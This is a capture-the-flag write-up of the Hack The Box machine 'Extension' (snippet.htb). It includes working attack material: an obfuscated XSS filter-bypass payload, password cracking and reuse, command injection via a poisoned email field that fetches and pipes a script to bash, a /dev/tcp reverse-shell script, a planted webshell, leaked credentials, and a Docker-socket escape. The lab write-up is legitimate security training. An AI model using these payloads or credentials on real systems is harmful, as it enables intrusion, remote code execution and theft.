# Extension

---

## Enumeration

- nmap TCP scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA)
|   256 913ab2922b637d91f1582b1b54f9703c (ECDSA)
|_  256 6520392ba73b33e5ed49a9acea01bd37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: snippet.htb
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Found `mail`, `dev` subdomains
- All team members have the same date of birth: `14th of November 1984`
- Potential users:

1. Charlie Rooper
2. Jean Castux
3. Thierry Halliday

- Register isn't allowed on the main domain `snippet.htb`
- `dev.` subdomain is a `Gitea` instance, it allows registeration.
- Found emails:

```
administrator@snippet.htb
charlie@snippet.htb 
jean@snippet.htb
```

- On the main domain, I found in page source code JSON data of routes, wrote `getRoutes.py` to extract the json.

```bash
python getRoutes.py | jq .
{
  "url": "http://snippet.htb",
  "port": null,
  "defaults": {},
  "routes": {
    "ignition.healthCheck": {
      "uri": "_ignition/health-check",
      "methods": [
        "GET",
        "HEAD"
      ]
    },
    "ignition.executeSolution": {
      "uri": "_ignition/execute-solution",
      "methods": [
        "POST"
      ]

     	<--SNIP-->
```

- Routes:

```json
      "uri": "_ignition/health-check",
      "uri": "_ignition/execute-solution",
      "uri": "_ignition/share-report",
      "uri": "_ignition/scripts/{script}",
      "uri": "_ignition/styles/{style}",
      "uri": "dashboard",
      "uri": "users",
      "uri": "snippets",
      "uri": "snippets/{id}",
      "uri": "snippets/update/{id}",
      "uri": "snippets/update/{id}",
      "uri": "snippets/delete/{id}",
      "uri": "new",
      "uri": "management/validate",
      "uri": "management/dump",
      "uri": "register",
      "uri": "login",
      "uri": "forgot-password",
      "uri": "forgot-password",
      "uri": "reset-password/{token}",
      "uri": "reset-password",
      "uri": "verify-email",
      "uri": "verify-email/{id}/{hash}",
      "uri": "email/verification-notification",
      "uri": "confirm-password",
      "uri": "logout",
```

- `management/dump` looks interesting, tried posting some random JSON data but got `Missing arguments` error
- Wrote `fuzzDump.py` script to fuzz this endpoint and found `download` key

```bash
python fuzzDump.py
...

Trying: download
download is a valid key!
```

- For values I found `users` and `profiles` using `wfuzz`
- Dumped all users' data, including emails and passwords, cracked a password using `john the ripper`

```bash
john --format=Raw-SHA256 crackThis.txt --wordlist=/usr/share/wordlists/rockyou.txt 

password123      (letha@snippet.htb)
```

- Modified `parseUsers.py` to check password reuse

```
letha@snippet.htb have the same password of password123
fredrick@snippet.htb have the same password of password123
gia@snippet.htb have the same password of password123
juliana@snippet.htb have the same password of password123
```

- After logging in, creating a snippet makes one with an ID of 3, skipping 2
- Access to snippet 2 is denied, tried all 4 accounts I got
- Jean's hash is not crackable with `rockyou.txt` wordlist
- Found 2 ways to read the private snippet

1. I can update the status of the snippet from private to public by intercepting a snippet I made, and changing the snippet ID to 2.
2. It's possible to view the snippet data without changing anything, by visiting `http://snippet.htb/snippets/update/2`

- Jean's private snippet:

```bash
curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
```
```bash
echo 'amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB' | base64 -d                          
jean:EHmfar1Y7ppA9O5TAIXnYnJpA
```

- Jean's creds: `jean:EHmfar1Y7ppA9O5TAIXnYnJpA`, These creds work on the `Gitea` instance
- After reading the `extension` repo, the `issues` page is vulnerable to XSS, and the following payload worked for me after bypassing all the found filters, this really took a while to craft a working payload!

```html
test<test><img SRC="x" onerror=eval.call`${"eval\x28atob`<BASE64 ENCODED JS>`\x29"}`>
```

- Hitback:

```bash
10.10.11.171 - - [15/Dec/2022 07:11:27] code 404, message File not found
10.10.11.171 - - [15/Dec/2022 07:11:27] "GET /HelloFromXss HTTP/1.1" 404 -

# CHARLIE'S REPOS:
10.10.11.171 - - [15/Dec/2022 07:28:58] "GET /W3siaWQiOjIsIm93bmVyIjp7ImlkIjozLCJsb2dpbiI6ImNoYXJsaWUiLCJmdWxsX25hbWUiOiIiLCJlbWFpbCI6ImNoYXJsaWVAc25pcHBldC5odGIiLCJhdmF0YXJfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi91c2VyL2F2YXRhci9jaGFybGllLy0xIiwibGFuZ3VhZ2UiOiIiLCJpc19hZG1pbiI6ZmFsc2UsImxhc3RfbG9naW4iOiIwMDAxLTA.....
```

- Found a backup private repo of Charlie's home backup
- To gain a foothold, I did the following steps:

1. Created a new account on the `Gitea` instance.
2. Logged in as `Jean` and added myself as a collaborator on jean's repo.
3. Switched back to my account, abused the XSS vulnerability and made Charlie add my account as a collaborator to his Backups repo
4. Downloaded `backup.tar.gz` from his repo and got an SSH key pair
5. logged on as Charlie using SSH, then switched users `su jean` with his Gitea password nad got user.txt

```bash
ssh charlie@$IP -i charlie.id_rsa 
charlie@extension:~$ id
uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)
charlie@extension:~$ su jean
Password: 
jean@extension:/home/charlie$
```

---

## Lateral Movement - PrivEsc

- Ran pspy, found a task being run updating a database using password `toor`.
- `mysql` does not exist on the target machine so I forwarded port 3306 to my attacking machine through the SSH connection and started enumerating the database

- Since I now can control the database, I update one of the users I owned `fredrick@snippet.htb` user type to be Manager

```sql
MySQL [webapp]> UPDATE users SET user_type = "Manager"  WHERE email="fredrick@snippet.htb";
Query OK, 1 row affected (0.079 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```
- Also found a vulnerable php file using `shell_exec` at `app/Http/Controllers/AdminController.php`:

```bash
jean@extension:~/projects/laravel-app$ grep -iR shell_exec
... 
app/Http/Controllers/AdminController.php:            $res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
```

- After reading the code at `AdminController.php`, a hash of a secret key with the email is compared to a value `cs` being sent witht the POST payload in account validation, so instead of calculating this `cs` value, I used mysql to create a new account with a poisoned email to exploit `shell_exec`:

```sql
MySQL [webapp]> describe users;

+-------------------+---------------------+------+-----+---------+-------+
| Field             | Type                | Null | Key | Default | Extra |
+-------------------+---------------------+------+-----+---------+-------+
| id                | bigint(20) unsigned | NO   |     | NULL    |       |
| name              | varchar(255)        | NO   |     | NULL    |       |
| email             | varchar(255)        | NO   |     | NULL    |       |
| email_verified_at | timestamp           | YES  |     | NULL    |       |
| password          | varchar(255)        | NO   |     | NULL    |       |
| remember_token    | varchar(100)        | YES  |     | NULL    |       |
| created_at        | timestamp           | YES  |     | NULL    |       |
| updated_at        | timestamp           | YES  |     | NULL    |       |
| user_type         | varchar(255)        | NO   |     | Member  |       |
+-------------------+---------------------+------+-----+---------+-------+
9 rows in set (0.076 sec)

MySQL [webapp]> INSERT INTO users (id, name, email, password, user_type) VALUES (900, "test", "test@test|curl 10.10.16.35", "test", "Member");
Query OK, 1 row affected (0.070 sec)
```

- And voila! poc worked and got a revshell after.

```bash
nc -lvnp 80                               
listening on [any] 80 ...
connect to [10.10.16.35] from (UNKNOWN) [10.10.11.171] 58274
GET / HTTP/1.1
Host: 10.10.16.35
User-Agent: curl/7.64.0
Accept: */*
```

- Setting up the payload:
- game.sh:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.35/9001 0>&1
```

```sql
UPDATE users SET email = "test@test|curl 10.10.16.35/game.sh -o - | bash #" WHERE name = "test";
```

```bash                     
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.35] from (UNKNOWN) [10.10.11.171] 35344
bash: cannot set terminal process group (45): Inappropriate ioctl for device
bash: no job control in this shell
application@4dae106254bf:/var/www/html/public$ which python3
which python3
application@4dae106254bf:/var/www/html/public$ which python
which python
/usr/bin/python
application@4dae106254bf:/var/www/html/public$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
application@4dae106254bf:/var/www/html/public$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001

application@4dae106254bf:/var/www/html/public$ export TERM=xterm-256color
application@4dae106254bf:/var/www/html/public$ stty rows 39 cols 157
application@4dae106254bf:/var/www/html/public$ 
```

- And I'm inside a docker container...
- Planted a webshell at `snippet.htb/game.php` in case i lose my revshell
- Interesting env variables:

```bash
MAIL_PASSWORD=8nSYkjlxtwFAcFZ9S1tg7d48WNXD6wPr1aeRmdRz
APP_SECRET=T8pQxcZe1mcVcdtbZRSqSCDNIiTmaYZjPQsemzuj
```

- Ran `deepce.sh`, found potential ways to escape the docker:

```bash
[+] Dangerous Capabilities .. Yes
Bounding set =cap_chown,cap_dac_override...
[+] Docker sock mounted ....... Yes

application@4dae106254bf:~$ find / -name docker.sock 2>/dev/null
/app/docker.sock

application@4dae106254bf:/app$ ls -la
total 8
drwxr-xr-x 1 application application 4096 Jun 24 15:56 .
drwxr-xr-x 1 root        root        4096 Dec 18 23:38 ..
srw-rw---- 1 root        app            0 Dec 18 23:38 docker.sock
```

- After some googling, I found [this script](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25) on Github, I modified it and ran these commands against the machine and got a revshell in the container with root filesystem mounted.

```bash
nc -lvnp 9002                             
listening on [any] 9002 ...
connect to [10.10.16.35] from (UNKNOWN) [10.10.11.171] 41488
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@615cfaf14665:/#
```
